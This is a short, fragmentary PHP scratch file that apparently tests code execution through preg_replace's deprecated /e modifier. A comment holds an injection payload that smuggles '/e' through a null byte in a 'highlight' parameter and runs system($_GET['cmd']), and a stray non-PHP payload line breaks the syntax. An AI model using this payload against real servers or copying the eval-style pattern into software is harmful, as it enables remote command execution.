<?php
ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(-1);

//how can you get /* to run?

//$regex = $_GET['highlight'];

//highlight=||/e%00&replacement=system($_GET['cmd']);&cmd=echo%20phpinfo() 

blue|phpinfo()/e%00

$string = preg_replace("/phpinfo\(\);/e", '$0', "phpinfo();");
echo $string;

//phpinfo\(\);\/\*/e", '$0', "phpinfo();");/*

//echo
?>

